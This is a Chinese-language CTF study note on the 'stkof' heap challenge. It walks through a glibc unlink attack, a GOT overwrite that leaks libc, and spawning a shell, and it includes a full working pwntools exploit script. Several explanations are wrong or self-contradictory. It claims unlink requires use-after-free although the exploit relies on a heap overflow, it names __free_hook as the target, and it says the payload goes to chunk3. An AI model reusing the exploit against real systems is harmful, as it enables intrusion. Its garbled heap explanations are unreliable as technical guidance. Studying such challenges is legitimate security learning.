TITLE UAF与unlink攻击

DATE 2026-07-23

TAG heap, unlink, UAF

SUMMARY 有关UAF的一些小尝试


- [[#UAF和unlink的关系|UAF和unlink的关系]]
  - [[#UAF和unlink的关系#总结|总结]]
- [[#pwndbg：不退出进程内重启|pwndbg：不退出进程内重启]]
- [[#pwndbg：看断点|pwndbg：看断点]]



- [[#题目分析：（看完exp逆向分析版）|题目分析：（看完exp逆向分析版）]]

	- [[#题目分析：（看完exp逆向分析版）#当输入为1时：对应exp alloc函数|当输入为1时：对应exp alloc函数]]
		- [[#当输入为1时：对应exp alloc函数#先看这行代码|先看这行代码]]
			- [[#先看这行代码#1. 拆开翻译|1. 拆开翻译]]
			- [[#先看这行代码#2. 合起来的意思|2. 合起来的意思]]
			- [[#先看这行代码#3. 运行时真实行为|3. 运行时真实行为]]
			- [[#先看这行代码#总结|总结]]
			- [[#先看这行代码#为什么这行对 PWN 至关重要？|为什么这行对 PWN 至关重要？]]
			- [[#先看这行代码#一句话记住|一句话记住]]

	- [[#题目分析：（看完exp逆向分析版）#target、fd、bk伪造——重要知识点——unlink关键|target、fd、bk伪造——重要知识点——unlink关键]]
		- [[#target、fd、bk伪造——重要知识点——unlink关键#解释：|解释：]]

	- [[#题目分析：（看完exp逆向分析版）#exp fill 函数：|exp fill 函数：]]
		- [[#exp fill 函数：#IDA反汇编代码解释：|IDA反汇编代码解释：]]
		- [[#exp fill 函数：#fill函数详解：|fill函数详解：]]
	- [[#题目分析：（看完exp逆向分析版）#第一个payload|第一个payload]]
	- [[#题目分析：（看完exp逆向分析版）#exp free函数：|exp free函数：]]
	- [[#题目分析：（看完exp逆向分析版）#第一处payload攻击：fill2 free3|第一处payload攻击：fill2 free3]]
	- [[#题目分析：（看完exp逆向分析版）#第二、第三个payload：|第二、第三个payload：]]
		- [[#第二、第三个payload：#1. `fill(2, payload)`：覆盖 chunk2 的数据区域|1. `fill(2, payload)`：覆盖 chunk2 的数据区域]]
		- [[#第二、第三个payload：#2. `fill(1, payload)`：把 `puts_plt` 写入某处|2. `fill(1, payload)`：把 `puts_plt` 写入某处]]
		- [[#第二、第三个payload：#3. `free(2)`：触发函数调用|3. `free(2)`：触发函数调用]]
		- [[#第二、第三个payload：#总结|总结]]
	- [[#题目分析：（看完exp逆向分析版）#泄露 puts got，得到libc基址，并得到system和binsh|泄露 puts got，得到libc基址，并得到system和binsh]]
	- [[#题目分析：（看完exp逆向分析版）#构造getshell，提权  GOT 劫持|构造getshell，提权  GOT 劫持]]



- [[#exp：|exp：]]

- [[#exp解释：|exp解释：]]
- [[#先记住核心|先记住核心]]
- [[#1. 初始化（不用讲）|1. 初始化（不用讲）]]
- [[#2. 功能函数（对应题目菜单）|2. 功能函数（对应题目菜单）]]
- [[#3. 申请 4 个堆块（关键布局）|3. 申请 4 个堆块（关键布局）]]
- [[#4. unlink 核心伪造（最关键代码）|4. unlink 核心伪造（最关键代码）]]
- [[#5. 触发 unlink！|5. 触发 unlink！]]
		- [[#构造getshell，提权  GOT 劫持#触发后发生了什么？|触发后发生了什么？]]
- [[#6. 用劫持的指针改 GOT 表|6. 用劫持的指针改 GOT 表]]
- [[#7. 泄露 libc 地址|7. 泄露 libc 地址]]
- [[#8. 计算 system 和 /bin/sh|8. 计算 system 和 /bin/sh]]
- [[#9. 拿 shell！|9. 拿 shell！]]
- [[#终极一句话总结（你一定要背）|终极一句话总结（你一定要背）]]


- [[#详细解释：|详细解释：]]
	- [[#详细解释：#为什么必须 4 块？|为什么必须 4 块？]]
		- [[#为什么必须 4 块？#1. chunk4 是为了**防止 free (chunk3) 时和 top chunk 合并**|1. chunk4 是为了**防止 free (chunk3) 时和 top chunk 合并**]]
		- [[#为什么必须 4 块？#2. chunk3 必须前后都有 “被占用块” 才能伪造 unlink|2. chunk3 必须前后都有 “被占用块” 才能伪造 unlink]]
		- [[#为什么必须 4 块？#3. chunk2 是攻击目标|3. chunk2 是攻击目标]]
		- [[#为什么必须 4 块？#4. chunk1 是后面用来改 GOT 表的|4. chunk1 是后面用来改 GOT 表的]]
		- [[#为什么必须 4 块？#终极极简总结|终极极简总结]]
	- [[#详细解释：#先看 IDA 里的关键：|先看 IDA 里的关键：]]
		- [[#先看 IDA 里的关键：#0x602140 到底是什么？|0x602140 到底是什么？]]
		- [[#先看 IDA 里的关键：#为什么 EXP 里要用它做 target？|为什么 EXP 里要用它做 target？]]
		- [[#先看 IDA 里的关键：#一句话总结|一句话总结]]
	- [[#详细解释：#GOT 表改写原理|GOT 表改写原理]]
		- [[#GOT 表改写原理#1. 先搞懂：GOT 表是干嘛的？|1. 先搞懂：GOT 表是干嘛的？]]
		- [[#GOT 表改写原理#2. 改写 GOT 表 = 偷换函数|2. 改写 GOT 表 = 偷换函数]]
		- [[#GOT 表改写原理#3. 你这道题里是怎么改的？|3. 你这道题里是怎么改的？]]
		- [[#GOT 表改写原理#4. 最终目的|4. 最终目的]]
		- [[#GOT 表改写原理#一句话终极总结|一句话终极总结]]
	- [[#详细解释：#unlink 数学原理（64 位）|unlink 数学原理（64 位）]]
		- [[#unlink 数学原理（64 位）#1. unlink 执行的两行代码|1. unlink 执行的两行代码]]
		- [[#unlink 数学原理（64 位）#2. 64 位下指针偏移固定|2. 64 位下指针偏移固定]]
		- [[#unlink 数学原理（64 位）#3. 让 unlink 结果等于 target|3. 让 unlink 结果等于 target]]
		- [[#unlink 数学原理（64 位）#4. 最简单记忆法（背这个就行）|4. 最简单记忆法（背这个就行）]]
		- [[#unlink 数学原理（64 位）#5. 对应你 EXP 里的代码|5. 对应你 EXP 里的代码]]






# UAF和unlink的关系

>[!CAUTION]
>
>**unlink exploit 必须依赖 UAF**才能实现。
>
简单说：
>
**UAF 是漏洞前提，unlink 是利用手法**。
>
没有释放后使用，就没法改 chunk 头部伪造 unlink 条件。

✅ 全局指针数组
✅ unlink 伪造
✅ UAF 作用
✅ GOT 表改写
✅ 为什么要 4 个堆块


## 总结

|架构|有 BYREF|无 BYREF|原因|
|---|---|---|---|
|**x86 (32位)**|不需要 +4|需要 +4|参数在栈上，IDA 遇到 BYREF 会重算偏移（已包含 ebp）|
|**x64 (64位)**|需要 +8|需要 +8|参数在寄存器，BYREF 不改变显示规则，统一加 8|

**记忆口诀**：

- x86 看 BYREF，有就不加
  
- x64 不管 BYREF，一律加 8
![[Pasted image 20260402130116.png]]





# pwndbg：不退出进程内重启

- **kill**：完全杀死进程，但不退出pwndbg，适合从头开始
- start：自动到main入口处
- run/r：从头开始，但不清理断点
# pwndbg：看断点

- info breakpoints/ i b
- del 1 2 3：快速删断点







![[839b035cac10193376d64c189f291f92.jpg]]




# 题目分析：（看完exp逆向分析版）

[[#当输入为1时：]]

---
## 当输入为1时：对应exp alloc函数

![[Pasted image 20260405204221.png]]

### 先看这行代码

```
(&::s)[++dword_602100] = v2;
```

#### 1. 拆开翻译

- `::s` = 全局变量 **s**（就是 **0x602140 指针数组**）
- `&::s` = s 的**起始地址**
- `dword_602100` = 一个**计数器**，记录当前申请到第几个堆
- `++dword_602100` = **先 +1，再使用**
- `[ ... ]` = 数组下标
- `= v2` = 把**malloc 返回的堆地址**存进去

#### 2. 合起来的意思

```
s[ 计数器+1 ] = 新申请的堆地址;
```

#### 3. 运行时真实行为

第一次调用 alloc：

```
++dword_602100 → 变成 1
s[1] = malloc返回的地址
```

第二次调用 alloc：

```
++dword_602100 → 变成 2
s[2] = malloc返回的地址
```

第三次 → `s[3]`

第四次 → `s[4]`

---

#### 总结

每次申请堆，就把堆指针存到全局数组 s 里，
并自动编号 1、2、3、4……**
也就是：
```
s[1] = 第1个堆指针
s[2] = 第2个堆指针
s[3] = 第3个堆指针
...
```

---
#### 为什么这行对 PWN 至关重要？

因为：

1. **s 数组在全局数据段（0x602140）**
2. 地址固定、不随机
3. 我们通过 **unlink** 就是要**劫持这个 s 数组**
4. 劫持后就能任意修改 `s[1]、s[2]...` 指向 GOT 表

这就是 **stkof 题目的核心攻击点**！

---
#### 一句话记住

**`(&::s)[++dword_602100] = v2`

= 把新堆指针存到全局数组 s 里，自动编号 1、2、3…**
[[#题目分析：（看完exp逆向分析版）]]          [[#4. unlink 核心伪造（最关键代码）]]

- target算出s的地址
- ![[Pasted image 20260406183207.png|669]]
- ![[Pasted image 20260406183418.png]]
- 这里s+0x10的原因是：
- 0x602140 → s\[0] （不用） 
- 0x602148 → s\[1] （第一个堆） 
- 0x602150 → s\[2] 【我们要改的就是这个！】 
- 0x602158 → s\[3]
- s+2\*8 = s + 0x10
- 必须是s\[2]的目的：让unlink把s\[2]的值改掉，让它指向数组本身
---
## target、fd、bk伪造——重要知识点——unlink关键

正常堆机制：
target = s\[2] 的地址
→ 去读 target 里的值
→ 得到堆块地址
→ 再在堆块地址 +0x10 是 fd 
→ 再 +0x18 是 bk

**但unlink攻击不按正常来，先看unlink的攻击逻辑：**
我们要欺骗 unlink 执行这两行：

```
P->fd->bk = P->bk
P->bk->fd = P->fd
```

我们**手动伪造**：

```
P->fd = target - 0x18
P->bk = target - 0x10
```

**不是去读内存！

是直接写死这两个值！

### 解释：
unlink执行完后，会自动计算出：P = target
也就是：s\[2] = target
这是我们要达到的目的
也就是直接给假的 fd / bk ，欺骗unlink，让其算出 target

---
## exp fill 函数：

![[Pasted image 20260406185809.png]]

### IDA反汇编代码解释：

1. v6变量：readfqword——栈金丝雀
2. v2 > 0x100000 —— 下标不能太大
3. 数组对应位置不能为空
4. : : s——指针数组
5. for循环 —— 读取数据并写入内存：从键盘读取n个字节，直接写入ptr指向的内存
6. 最终校验：如果n不等于0也就是没写够长度，失败，否则成功写入所有数据

### fill函数详解：

向指定数组位置对应的堆块写入数据

---



## 第一个payload

payload核心是将伪造好的fd和bk填入第二个堆块，这里再复习一下堆结构：
```plaintext
prevsize 8
size     8
fd       8
bk       8
content  8
```

>[!TIP]
>注意！
>这里填充 a 是 fastbin攻击以及unlink堆利用最关键的对齐填充，目的为了满足堆块的物理结构规则，否则会崩溃。

---



## exp free函数：

![[Pasted image 20260407094146.png]]

sub_400B07是释放全局数组的堆块，free则是调用这个函数相当于就是给指定堆块释放

---



## 第一处payload攻击：fill2 free3

```python
# 1. 构造伪造的假 chunk
payload = p64(0) + p64(0x30)   # 假chunk 的 prev_size + size
payload += p64(fd) + p64(bk)   # unlink 关键指针
payload += b"a"*0x10           # 补齐到 0x30 大小

# 2. 关键！覆盖 chunk2 的 next chunk 头部！
payload += p64(0x30) + p64(0x90)

# 3. 把 payload 发送到 chunk2
fill(2, payload)

# 4. 释放 chunk3 → 触发 unlink！
free(3)
```

> [!IMPORTANT]
> 这里覆盖了chunk3的头部，这是unlink攻击必须做的一步
> 通过堆溢出，覆盖chunk3头部，告诉glibc，前面那个chunk2的大小是0x30（这样才能和伪造的chunk2大小对应上，堆结构才合法），后面的0x90是chunk3的真实大小（目的是保持合法，free时不会崩溃）

接着这里free(3)
glibc会：
1. 看到chunk3被释放
2. 检查前一个块（chunk2）是否空闲
3. 发现chunk2空闲 → 触发合并
4. 合并时执行unlink宏
5. unlink会使用伪造的fd和bk
6. 最终把全局指针chunk2改成  __ free_hook 或    __ malloc_hook

>[!CAUTION]
> Linux堆判断一个块是否空闲，只看后面那个chunk的size字段第0位（PREV_INUSE）
> 如果最低位是 1 就是说明还在使用，否则就是空闲

我们的payload 0x90 = 0b10010000，说明前一个chunk（chunk2）是空闲的
反之，如果是 0x31 = 0b10010001，就说明还在使用

---





## 第二、第三个payload：

![[Pasted image 20260407124818.png]]

第二个是向已经可控地可写的 chunk2 写入free和puts的got
第三个则是向第一个chunk写入puts的plt，然后free chunk2
- **这里的目的是泄露libc的栈基址**

---
这段代码的作用是**篡改 GOT 表，实现信息泄露和 getshell**。分三步：

### 1. `fill(2, payload)`：覆盖 chunk2 的数据区域
```python
payload = b"a"*0x10 + p64(free_got) + p64(puts_got)
```
- 因为前面 unlink 已经把 `chunk2` 的指针改成了 `target`（指向 `free_got` 附近）
- 现在写 chunk2 实际上就是**往 `free_got` 附近写数据**
- 效果：`free_got` 被覆盖成 `puts_got` 的值，`puts_got` 被覆盖成其他值

**但这里有个关键**：经过 unlink 后，chunk2 的 `fd` 和 `bk` 已经被篡改，`fill(2)` 会写入到 GOT 表区域。

### 2. `fill(1, payload)`：把 `puts_plt` 写入某处
```python
payload = p64(puts_plt)
fill(1, payload)
```
- 把 chunk1 的内容改成 `puts_plt` 的地址
- 为下一步 `free(2)` 做准备

### 3. `free(2)`：触发函数调用
- 此时 `free_got` 已经被覆盖成 `puts_got` 的地址
- 调用 `free(2)` 实际执行的是 `puts(puts_got)` → 泄露 `puts` 的真实地址
- 从而计算出 libc 基址和 `system`、`/bin/sh` 的地址

### 总结
这段代码实现了：
1. **GOT 劫持**：把 `free` 改成 `puts`
2. **地址泄露**：`free(2)` → `puts(puts_got)` 输出 libc 地址
3. **后续 getshell**：再用同样方法把 `free` 改成 `system`，`free(4)` 执行 `system("/bin/sh")`

---






## 泄露 puts got，得到libc基址，并得到system和binsh


## 构造getshell，提权  GOT 劫持

![[Pasted image 20260407174035.png]]

- **这里在第一处fill就以及把 free 函数的 got条目给修改了，换成了system的地址**
---












# exp：

```python
from pwn import *
p = process('./stkof')
# p=remote("node3.buuoj.cn",28999)
context.log_level = 'debug'

elf = ELF("./stkof")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

def alloc(size):
    p.sendline(str(1))
    p.sendline(str(size))
    p.recvuntil("OK")

def fill(idx,content):
    p.sendline(str(2))
    p.sendline(str(idx))
    p.sendline(str(len(content)))
    p.sendline(content)
    p.recvuntil("OK")

def free(idx):
    p.sendline(str(3))
    p.sendline(str(idx))

alloc(0x30)     # 伪造 四个 堆块
alloc(0x30)
alloc(0x80)
alloc(0x30)

target = 0x602140 + 0x10    # 找到s数组地址并加0x10得到s[2]地址
fd = target - 0x18   # 这里注意，可以看前面的分析
bk = target - 0x10

payload = p64(0) + p64(0x30)
payload += p64(fd) + p64(bk)
payload += b"a"*0x10

payload += p64(0x30) + p64(0x90)
fill(2,payload)
free(3)

payload = b"a"*0x10
payload += p64(free_got) + p64(puts_got)
fill(2,payload)

payload = p64(puts_plt)
fill(1,payload)
free(2)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:]+b'\x00\x00')
log.success(hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search("/bin/sh"))

log.success(hex(libc_base))
log.success(hex(system))
log.success(hex(binsh))

payload = p64(system)
fill(1,payload)

fill(4,b'/bin/sh\x00')
free(4)

p.interactive()

```



# exp解释：
[[#UAF和unlink的关系]]

# 先记住核心

这题 = **unlink 利用 + 劫持全局指针数组 + 改 GOT 表**

---

# 1. 初始化（不用讲）

```
p = process('./stkof')
context.log_level = 'debug'
elf = ELF("./stkof")
libc = ELF(...)
```

作用：启动程序、加载文件、获取函数地址。

---

# 2. 功能函数（对应题目菜单）

```
def alloc(size):   # 1: malloc 申请堆
def fill(idx,content): # 2: 写堆
def free(idx):     # 3: free 释放堆
```

就是调用题目功能。

---

# 3. 申请 4 个堆块（关键布局）


```
alloc(0x30)  # chunk1
alloc(0x30)  # chunk2
alloc(0x80)  # chunk3 （用来伪造 unlink）
alloc(0x30)  # chunk4 （隔离块，防止和top chunk合并）
```

**内存布局：**


```
chunk1 -> chunk2 -> chunk3 -> chunk4
```

为什么这样申请？

因为 **unlink 必须操作连续的两个堆块**，我们要改 chunk2 的指针。

---

# 4. unlink 核心伪造（最关键代码）
[[#先看这行代码]]

```
target = 0x602140 + 0x10  # 全局指针数组 s 的地址
fd = target - 0x18         # 伪造 fd
bk = target - 0x10         # 伪造 bk
```

**这是 unlink 攻击核心：**

- `0x602140` = 程序存储堆指针的**全局数组 s**
- 我们要让 unlink 后，**chunk2 指针直接指向这个全局数组**

然后构造 payload 写入 chunk3：

```
payload = p64(0) + p64(0x30)  # 伪造 prev_size + chunk3 头
payload += p64(fd) + p64(bk)  # 伪造 fd / bk （unlink 必备）
payload += b"a"*0x10          # 填充
payload += p64(0x30) + p64(0x90) # 伪造下一个块头
```

---

# 5. 触发 unlink！

```
fill(2, payload)  # 把伪造数据写入 chunk3
free(3)           # free chunk3 → 触发 unlink
```

### 触发后发生了什么？

unlink 机制被欺骗，执行了一个**魔法效果**：

```
chunk2 的指针 = &s[2] - 0x18
```

最终效果：

**s \[2] 这个指针，现在可以直接读写全局指针数组 s 本身！**

这就是 **unlink 最终目的：劫持指针数组**。

---

# 6. 用劫持的指针改 GOT 表

```
payload = b"a"*0x10
payload += p64(free_got) + p64(puts_got)
fill(2, payload)
```

现在 s \[2] 能控制整个指针数组：

- 让 s \[1] = free_got
- 让 s \[2] = puts_got

**等于我们可以直接改写 GOT 表！**

---

# 7. 泄露 libc 地址

```
payload = p64(puts_plt)
fill(1, payload)  # 把 free 改成 puts
free(2)           # free(puts_got) → 泄露地址
```

- 把 `free` 函数换成 `puts`
- 调用 `free(2)` 实际变成 `puts(puts_got)`
- 成功泄露出 libc 基地址

---

# 8. 计算 system 和 /bin/sh

```
libc_base = puts_addr - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search("/bin/sh"))
```

---

# 9. 拿 shell！

```
payload = p64(system)
fill(1, payload)  # 把 free 换成 system

fill(4, b'/bin/sh\x00')
free(4)           # 执行 system("/bin/sh")
```

最终执行：

```
system("/bin/sh")
```

拿到 shell！

---

# 终极一句话总结（你一定要背）

这道题的完整逻辑链：

1. 申请堆块构造布局
2. 伪造堆块触发 **unlink**
3. 劫持 **全局指针数组**
4. 改 **GOT 表** 泄露 libc
5. 把 free 换成 system
6. 执行 `/bin/sh`

---
[[#UAF和unlink的关系]]
# 详细解释：

1. unlink 数学原理（为什么 fd=target-0x18）[[#unlink 数学原理（64 位）]]
2. 为什么要申请 4 个堆块 [[#为什么必须 4 块？]]
3. 全局指针数组 0x602140 是什么 [[#先看 IDA 里的关键：]]
4. GOT 表改写原理[[#GOT 表改写原理]]





---
## 为什么必须 4 块？

```
chunk1（0x30）
chunk2（0x30）
chunk3（0x80）← 用来伪造 unlink
chunk4（0x30）← 关键：隔离块
```

### 1. chunk4 是为了**防止 free (chunk3) 时和 top chunk 合并**

- 如果你不申请 chunk4
- free (chunk3) 后，它后面直接是 top chunk
- glibc 会直接把 chunk3 合并进 top chunk
- **根本不会进入 unlink 流程**

unlink 只在**和另一个空闲块相邻合并**时才触发。

### 2. chunk3 必须前后都有 “被占用块” 才能伪造 unlink

- 前：chunk2 占用
- 后：chunk4 占用

这样 free (chunk3) 时：

- 不会向前合并（chunk2 在用）
- 不会向后合并（chunk4 在用）
- 才能让我们**伪造的 prev_size、size、fd、bk 生效**，触发我们构造的 unlink

### 3. chunk2 是攻击目标

unlink 完成后，我们要劫持的是 **chunk2 的指针**，让它指向全局指针数组 s。

### 4. chunk1 是后面用来改 GOT 表的

后面要把 chunk1 指向 free_got、puts_got 用。

---

### 终极极简总结

4 个块缺一不可：

1. **chunk1**：后续改 GOT 表
2. **chunk2**：unlink 后要劫持的指针
3. **chunk3**：存放伪造 unlink 结构
4. **chunk4**：挡路，防止 chunk3 合并进 top chunk，保证 unlink 能触发
[[#详细解释：]]










## 先看 IDA 里的关键：

```
(&::s)[++dword_602100] = v2;
```

- `dword_602100`：记录当前申请到第几个堆
- `s`：就是**存所有堆指针的全局数组**

这个 `s` 在内存里的地址，就是 **`0x602140`**

---

### 0x602140 到底是什么？

它就是程序里的：

```
char *s[0x100000];  // 在数据段 0x602140 开头
```

- 类型：**指针数组**，每个元素 8 字节（64 位）
- `s[1]` 存第 1 个堆地址
- `s[2]` 存第 2 个堆地址
- `s[3]` 存第 3 个堆地址
  
    ……

所以：

- `0x602140 + 0x00` → s\[0]
- `0x602140 + 0x08` → s\[1]
- `0x602140 + 0x10` → s\[2]
- `0x602140 + 0x18` → s\[3]
  
    ……

---

### 为什么 EXP 里要用它做 target？

```
target = 0x602140 + 0x10   # 就是 s[2] 的地址
fd = target - 0x18
bk = target - 0x10
```

unlink 触发后，会执行：

```
P->fd->bk = P->bk
P->bk->fd = P->fd
```

最终效果：

**s \[2] 这个指针，被改成指向 s 数组本身**

之后你用 `fill(2, ...)` 就可以**直接修改整个 s 数组**，想让 s \[1]、s \[2] 指向 GOT 表都行。

---

### 一句话总结

**0x602140 = 程序存放所有堆指针的全局数组首地址**

unlink 就是为了劫持这个数组，实现任意地址读写。
[[#详细解释：]]









## GOT 表改写原理


### 1. 先搞懂：GOT 表是干嘛的？

程序要调用系统函数（`free`、`puts`、`printf`），**不知道它们具体在哪**。

所以：

- 程序留一个**表格**存这些函数的真实地址
- 这个表格就叫 **GOT 表**
- 调用函数时，**先去 GOT 表里查地址**

---

### 2. 改写 GOT 表 = 偷换函数

**GOT 表改写 = 把表里的地址偷偷换成你想要的地址**

比如：

- 表里本来存的是：`free` 函数地址
- 你改成：`system` 函数地址
- 下次程序调用 `free()` → **实际变成调用 `system()`**

这就是 **GOT 劫持**，PWN 拿 shell 最常用的手段！

---

### 3. 你这道题里是怎么改的？

你通过 **unlink** 拿到了**任意地址写**的能力。

于是你干了这件事：

```
payload = p64(free_got) + p64(puts_got)
fill(2, payload)
```

意思是：

- 让 `s[1]` 指向 **free@GOT**
- 让 `s[2]` 指向 **puts@GOT**

然后：

```
payload = p64(puts_plt)
fill(1, payload)
```

意思是：

- 往 `free@GOT` 里写入 `puts` 地址
- 以后调用 `free` → **变成调用 `puts`**

---

### 4. 最终目的

最后一步：

```
payload = p64(system)
fill(1, payload)
```

把 `free` 换成 **system**

然后：

```
fill(4, b'/bin/sh\x00')
free(4)
```

相当于执行：

```
system("/bin/sh");
```

直接拿到 shell！

---

### 一句话终极总结

**GOT 表是函数地址表，改写它 = 偷换系统函数，让程序执行你的命令。**

---
[[#详细解释：]]








## unlink 数学原理（64 位）

unlink绕过公式：

设 P 为可伪造的 fake chunk 地址， ptr 指向 P 的全局指针地址：
- 设置 P -> fd = ptr - 0x18
- 设置 P -> bk = ptr - 0x10
  (FD =  p -> fd)
  (BK = p -> bk)

验证：
- FD -> bk = (ptr - 0x18) + 0x18 = ptr = P
  （FD -> bk = FD(ptr-0x18)+0x18(FD的bk) - prev_size/size/fd(+0x10)/bk(+0x18)/content
- BK -> fd = (ptr - 0x10) + 0x10 = ptr = P
结果：
- \*ptr = ptr - 0x18：指针自减，实现任意地址写

---

### 1. unlink 执行的两行代码

当你 free 一个堆块时，glibc 会执行：

```
P->fd->bk = P->bk;
P->bk->fd = P->fd;
```

我们的目标：

**让执行后 `P = &target`**

也就是让指针 **指向我们想控制的地址（全局指针数组 s）**

---

### 2. 64 位下指针偏移固定

在 64 位程序里：

- `fd` 是 chunk 内第 **1 个**指针（偏移 0x10）
- `bk` 是 chunk 内第 **2 个**指针（偏移 0x18）

```
chunk结构：   注意是十六进制
0x00 prev_size
0x08 size
0x10 fd  ——→ 我们伪造
0x18 bk  ——→ 我们伪造
```

---

### 3. 让 unlink 结果等于 target

我们希望：

```
P = target
```

代入 unlink 公式后，**数学上唯一解**就是：

```
fd = target - 0x18
bk = target - 0x10
```

---

### 4. 最简单记忆法（背这个就行）

**64 位 unlink 固定公式：**

```
fd = target - 0x18
bk = target - 0x10
```

---

### 5. 对应你 EXP 里的代码

```
target = 0x602140 + 0x10  # s[2] 的地址
fd = target - 0x18
bk = target - 0x10
```

**这就是数学上唯一能成功 unlink 的值**

改别的数字都会直接崩溃。

---

[[#详细解释：]]